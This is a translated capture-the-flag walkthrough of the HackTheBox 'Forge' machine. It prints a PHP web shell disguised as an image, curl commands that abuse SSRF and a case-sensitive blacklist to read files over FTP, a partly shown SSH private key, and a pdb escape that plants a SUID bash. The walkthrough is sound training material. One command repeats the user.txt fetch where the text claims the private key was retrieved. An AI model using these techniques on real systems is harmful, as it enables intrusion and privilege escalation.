<html>
<head>
<title>Forge from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">从HackTheBox锻造—详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/forge-from-hackthebox-detailed-walkthrough-26cec1c8df1a?source=collection_archive---------1-----------------------#2022-01-20">https://infosecwriteups.com/forge-from-hackthebox-detailed-walkthrough-26cec1c8df1a?source=collection_archive---------1-----------------------#2022-01-20</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="23f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">展示完成盒子所需的所有工具和技术。</p><h1 id="cb51" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">机器信息</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/548d14e1223f81b9ec07b2a657eeb318.png" data-original-src="https://miro.medium.com/v2/resize:fit:950/format:webp/0*5YwyG7UX60lK_bnE.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">用黑盒子锻造</figcaption></figure><p id="c665" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Forge是HackTheBox上的中型机器。我们从一个简单的网站开始，经过一些枚举和测试，我们找到了一种方法来上传一个文件，允许在机器上执行命令。我们用这个来解密一个SSH私有密钥，它给了我们用户级的访问权限。权限提升包括利用易受攻击的Python脚本和使用pdb获取根外壳。</p><p id="a084" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所需技能是网络和操作系统枚举知识。学习的技能是调查和绕过网络服务器上的防御。</p><div class="lv lw gp gr lx ly"><a href="https://www.hackthebox.eu/home/machines/profile/376" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">破解盒子::渗透测试实验室——伪造</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">www.hackthebox.eu</p></div></div><div class="mh l"><div class="mi l mj mk ml mh mm lp ly"/></div></div></a></div><h1 id="92f0" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">初步侦察</h1><p id="cc18" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ms"><img src="../Images/ef73efd79d41b0834ee0fd70a2955aa2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SQE21i5VFFF3l-m8CrgLpg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Nmap TCP端口扫描</figcaption></figure><p id="ca7b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">乍一看没什么可做的。首先将服务器IP添加到我们的hosts文件中:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="3d62" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/forge]<br/>└─# echo 10.10.11.111 forge.htb &gt;&gt; /etc/hosts</span></pre><h1 id="4798" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">网站探索</h1><p id="0af2" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们有一个简单的静态网页，图片画廊:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nh"><img src="../Images/d1241aca4e108606d9daf219fd1c94b2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Ski3xbqiKx3Tusz6.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">80端口上的画廊网站</figcaption></figure><p id="f456" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里没有什么有趣的东西，源代码也没有揭示任何东西。我们有上传图片的链接:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/ec04872c5e7852d7b27bacafa6f4c526.png" data-original-src="https://miro.medium.com/v2/resize:fit:1066/format:webp/0*1ND58F-ZgXJb-f_-.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">在Forge网站上传图片部分</figcaption></figure><p id="8e89" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">点击<strong class="jp ir">从url </strong>上传，并输入<a class="ae nj" href="http://admin.forge.htb" rel="noopener ugc nofollow" target="_blank"> http://admin.forge.htb </a>，得到如下信息:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/3af04f018fbc93fdaebd10b274eb22b2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1328/format:webp/0*6bswKF4AqEB2_fI_.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">从服务器的URL上传被阻止</figcaption></figure><h1 id="c786" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">恶意文件</h1><p id="37ea" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">所以接下来我创建了一个假的jpg来测试命令的执行:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="5956" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/forge]<br/>└─# cat test.php.jpg<br/>GIF89a;<br/>&lt;?php<br/>$cmd=$_GET['cmd'];<br/>system($cmd);<br/>?&gt;</span></pre><p id="3e29" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我点击了<strong class="jp ir">上传本地文件</strong>，选择了上面我创建的文件:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/89ad91ec0e63eb3ce349a1bc190699fd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1078/format:webp/0*xTTC_TWTWwQ5uNNa.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">从本地文件上传作品</figcaption></figure><p id="0b61" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这似乎奏效了:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/8d61bfbb807b3ffc0265b3b170498e4f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1078/format:webp/0*irf6iXHBmoQjfq3C.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">上传文件会返回URL</figcaption></figure><p id="c20f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查我是否看到文件在创建时已上传:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="0e42" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/forge]<br/>└─# curl http://forge.htb/uploads/IKExHjc8JZpazyGNcp02<br/>GIF89a;<br/>&lt;?php<br/>$cmd=$_GET['cmd'];<br/>system($cmd);<br/>?&gt;</span></pre><h1 id="cca4" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Gobuster</h1><p id="c047" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">但是它不被视为PHP文件，所以双扩展名不起作用。一些枚举的时间:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nm"><img src="../Images/96c11db0855ba60509cf84cec197a98d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KS5gTFufM_nCiw73ucJacQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">目录的Gobuster枚举</figcaption></figure><p id="8466" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我没有找到任何感兴趣的子文件夹，接下来尝试vhosts:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nn"><img src="../Images/3c78645cef962658ae026317bc147a6a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fX4JOV548bHNsRSoCfpbYg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">虚拟主机的Gobuster枚举</figcaption></figure><p id="ba3a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里的输出很长，包含所有的302，但是搜索20x的状态代码发现了这个:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="4024" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/forge]<br/>└─# cat results.txt | grep "Status: 20"<br/>Found: admin.forge.htb (Status: 200) [Size: 27]</span></pre><h1 id="df58" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">管理门户</h1><p id="0799" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">让我们添加到我们的主机文件:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="1d56" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/forge]<br/>└─# echo 10.10.11.111 admin.forge.htb &gt;&gt; /etc/hosts</span></pre><p id="d696" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">试图浏览到它给出了这个:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi no"><img src="../Images/4853fefa91e9190674d60594b50f4ea5.png" data-original-src="https://miro.medium.com/v2/resize:fit:772/format:webp/0*QDeVFFj2KKHhSxN0.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">对管理门户的访问被阻止</figcaption></figure><p id="9d05" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在对文件和URL进行了大量的修改后，我终于发现黑名单是区分大小写的，所以这是可行的:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi np"><img src="../Images/59df2af576add8454129a22fabbf53b0.png" data-original-src="https://miro.medium.com/v2/resize:fit:792/format:webp/0*tMK7ke5OrUfxxkrF.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">使用不同的大小写绕过黑名单</figcaption></figure><p id="5a1b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我没有提供文件，只是进入管理子网站，我们得到这个:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/2f9b73f9cbf99731e8547eb369684e72.png" data-original-src="https://miro.medium.com/v2/resize:fit:1324/format:webp/0*X9YyliamJPN-dIGC.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">成功上传会返回另一个URL</figcaption></figure><p id="cf9f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是，在浏览器中查看它会产生一个错误:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nr"><img src="../Images/f84eb9e30757275a40c59b9be6f92d6c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*kiOhzdRIzfcspErc.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">尝试查看管理URL时出错</figcaption></figure><h1 id="e1aa" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">管理重定向</h1><p id="662d" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">如果我们使用curl，我们会看到链接实际上是一个html页面:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ns"><img src="../Images/0ad99c9b3f379074e2e83d7e49a2aa73.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_awjwD4tR36dOysaOH-yyg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">返回了管理门户页面源</figcaption></figure><p id="d22c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们卷曲它，我们会得到和以前一样的信息:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="a662" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/forge]<br/>└─# curl http://ADMIN.FORGE.HTB/announcements<br/>Only localhost is allowed!</span></pre><h1 id="4344" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">旁路保护</h1><p id="231b" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">如果我们将<a class="ae nj" href="http://ADMIN.FORGE.HTB/announcements" rel="noopener ugc nofollow" target="_blank">http://ADMIN.FORGE.HTB/announcements</a>放入上传页面上的“从url上传”框并提交，我们会得到另一个文件:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/ca1de90615cbedcded100f528bdc3116.png" data-original-src="https://miro.medium.com/v2/resize:fit:964/format:webp/0*zc_ddDaDeSJ_T2XE.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">从上传页面收到另一个URL</figcaption></figure><p id="62b8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们把它卷起来:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nu"><img src="../Images/5adef8edd09dc3e58c8dad88d357e422.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RXD7BvL1GLmpYp8ULfi1LA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">通知页面源已返回</figcaption></figure><h1 id="9ab0" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">上传页面</h1><p id="85cf" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">为了避免在浏览器中浪费时间，从现在开始我将改用Curl。上面我们已经得到了FTP证书和一个提示，我们可以通过/上传使用？u=参数。从前面的扫描中我们看到FTP被过滤，所以可以假设我们需要通过相同的网页访问。</p><p id="2064" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下面是我们使用Curl的方法:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="c2f9" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/forge]<br/>└─# curl -s -d 'url=http://ADMIN.FORGE.HTB/upload?u=ftp://&lt;HIDDEN&gt;@FORGE.HTB&amp;remote=1' -X POST http://forge.htb/upload</span></pre><p id="47b7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由此我们使用-X给出上传页面的URL，然后使用-d发送我们想要发布的数据。这里我给了它FTP证书。</p><p id="6665" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">反应看起来不错:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="24dc" class="nc km iq my b gy nd ne l nf ng">&lt;center&gt;<br/>    &lt;strong&gt;File uploaded successfully to the following url:&lt;/strong&gt;<br/>    &lt;/center&gt;<br/>    &lt;/h1&gt;<br/>    &lt;h1&gt;<br/>        &lt;center&gt;<br/>            &lt;strong&gt;&lt;a href="http://forge.htb/uploads/lmlmHMB1xbKc89Cg8jJm"&gt;http://forge.htb/uploads/lmlmHMB1xbKc89Cg8jJm&lt;/strong&gt;<br/>        &lt;/center&gt;</span></pre><p id="eeb1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到用户主文件夹的内容:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="86a9" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/forge]<br/>└─# curl http://forge.htb/uploads/lmlmHMB1xbKc89Cg8jJm                                                                                 <br/>drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap<br/>-rw-r-----    1 0        1000           33 Oct 22 04:54 user.txt</span></pre><h1 id="d5ee" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">卷曲计数</h1><p id="3f64" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们可以通过将从curl返回的文件名传递给curl，剪切出我们想要的部分，从而使这变得更容易:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="abb4" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/forge]<br/>└─# curl `curl -s -d 'url=http://ADMIN.FORGE.HTB/upload?u=ftp://&lt;HIDDEN&gt;@ADMIN.FORGE.HTB&amp;remote=1' -X POST http://forge.htb/upload | grep uploads | cut -d '"' -f 2` <br/>drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap<br/>-rw-r-----    1 0        1000           33 Oct 22 04:54 user.txt</span></pre><p id="77f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们可以更容易地与它互动。让我们获取用户标志:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="569d" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/forge]<br/>└─# curl `curl -s -d 'url=http://ADMIN.FORGE.HTB/upload?u=ftp://&lt;HIDDEN&gt;@ADMIN.FORGE.HTB/user.txt&amp;remote=1' -X POST http://forge.htb/upload | grep uploads | cut -d '"' -f 2`<br/>&lt;HIDDEN&gt;</span></pre><h1 id="41b9" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">数据泄漏</h1><p id="8068" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我花了一些时间试图找到一些有用的东西，最终记住你不能在FTP中看到隐藏的文件。会不会简单到用户有一个. ssh文件夹，里面有一个我可以获取的私钥:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="dda8" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/forge]<br/>└─# curl `curl -s -d 'url=http://ADMIN.FORGE.HTB/upload?u=ftp://&lt;HIDDEN&gt;@ADMIN.FORGE.HTB/user.txt&amp;remote=1' -X POST http://forge.htb/upload | grep uploads | cut -d '"' -f 2`<br/>&lt;HIDDEN&gt;</span></pre><p id="8f69" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">原来就是这么简单！让我们将它回显到Kali上的一个文件中，这样我们就可以使用它通过SSH进行连接:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="82d2" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/forge]<br/>└─# echo "-----BEGIN OPENSSH PRIVATE KEY-----     <br/>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gt<br/>NhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtH<br/>&lt;SNIP&gt;<br/>-----END OPENSSH PRIVATE KEY-----<br/>" &gt; /root/htb/forge/id_rsa<br/><br/>┌──(root💀kali)-[~/htb/forge]<br/>└─# chmod 600 id_rsa</span></pre><h1 id="d921" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">SSH访问</h1><p id="1883" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">现在我们可以以用户身份登录:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="fcfd" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/forge]<br/>└─# ssh -i id_rsa user@forge.htb<br/>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)<br/>Last login: Sat Oct 23 15:39:54 2021 from 10.10.15.24<br/>-bash-5.0$ whoami<br/>user</span></pre><p id="dcee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我首先检查了sudo权限，并立即找到了我们的升级途径:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="0e30" class="nc km iq my b gy nd ne l nf ng">-bash-5.0$ sudo -l<br/>Matching Defaults entries for user on forge:<br/>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br/><br/>User user may run the following commands on forge:<br/>    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py</span></pre><h1 id="116b" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Python脚本</h1><p id="9e8c" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们可以在没有密码的情况下以root用户身份运行python脚本。让我们检查一下脚本:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nv"><img src="../Images/6016f37aeb8431b739711bc2a6526192.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gYlXuvaPFl3vxKhEGlrSzg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">远程管理Python脚本</figcaption></figure><p id="a84a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到这是一个简单的脚本，运行时监听本地主机上的随机端口。当你连接到它，你有几个选项来查看进程，内存或插座。它甚至给了我们密码！关键部分是except子句，它将我们带到名为<a class="ae nj" href="https://docs.python.org/3/library/pdb.html" rel="noopener ugc nofollow" target="_blank"> pdb </a>的交互式源代码调试器。如果我们触发一个异常，我们将以root用户身份出现在Python提示符下，这样我们就可以很容易地完成装箱。</p><p id="1a89" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们以root用户身份运行脚本:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="9980" class="nc km iq my b gy nd ne l nf ng">-bash-5.0$ sudo /usr/bin/python3 /opt/remote-manage.py<br/>Listening on localhost:49630</span></pre><p id="4285" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到它在端口49630上等待我们连接。让我们再次以用户身份通过SSH从第二个终端登录:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="f07f" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/forge]<br/>└─# ssh -i id_rsa user@forge.htb                             <br/>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)<br/>Last login: Sun Oct 24 10:10:40 2021 from 10.10.14.192<br/>-bash-5.0$</span></pre><p id="5cc2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们可以连接到本地主机上的脚本:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="6d78" class="nc km iq my b gy nd ne l nf ng">-bash-5.0$ nc localhost 49630<br/>Enter the secret passsword: &lt;HIDDEN&gt;<br/>Welcome admin!<br/><br/>What do you wanna do: <br/>[1] View processes<br/>[2] View free memory<br/>[3] View listening sockets<br/>[4] Quit</span></pre><h1 id="dda6" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">根标志</h1><p id="f1cd" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">您可以输入四个预期数字之外的任何数字。之后，脚本似乎挂起，如果您切换到您的另一个终端，您会看到脚本已经崩溃，您现在在pdb:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="39c5" class="nc km iq my b gy nd ne l nf ng">invalid literal for int() with base 10: b'pencerwashere'<br/>&gt; /opt/remote-manage.py(27)&lt;module&gt;()<br/>-&gt; option = int(clientsock.recv(1024).strip())<br/>(Pdb)</span></pre><p id="8c80" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到脚本导入了操作系统模块，因此我们可以使用它以root用户身份执行系统命令:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="0b86" class="nc km iq my b gy nd ne l nf ng">(Pdb) import os<br/>(Pdb) os.system ('cp /bin/bash /dev/shm/bash')<br/>(Pdb) os.system ('chmod u+s /dev/shm/bash')<br/>(Pdb) exit</span></pre><p id="a01a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里，我们可以做很多不同的事情，我只是将bash复制到一个临时区域，并添加了sticky位，这样我就可以在没有密码的情况下以root用户身份运行它。</p><p id="9fa7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们可以抓取根标志来完成该框:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="c619" class="nc km iq my b gy nd ne l nf ng">-bash-5.0$ cd /dev/shm<br/>-bash-5.0$ bash -p<br/>bash-5.0# whoami<br/>root<br/>bash-5.0# cat /root/root.txt <br/>&lt;HIDDEN&gt;</span></pre><p id="9769" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一个很容易说它被归类为中等的盒子。我希望你喜欢它，下次再见。</p></div><div class="ab cl nw nx hu ny" role="separator"><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob"/></div><div class="ij ik il im in"><p id="56d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="3401" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">推特—<a class="ae nj" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae nj" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="ff5b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="od">原载于2022年1月20日</em><a class="ae nj" href="https://pencer.io/ctf/ctf-htb-forge" rel="noopener ugc nofollow" target="_blank"><em class="od">https://pencer . io</em></a><em class="od">。</em></p></div><div class="ab cl nw nx hu ny" role="separator"><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob"/></div><div class="ij ik il im in"><p id="7841" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh 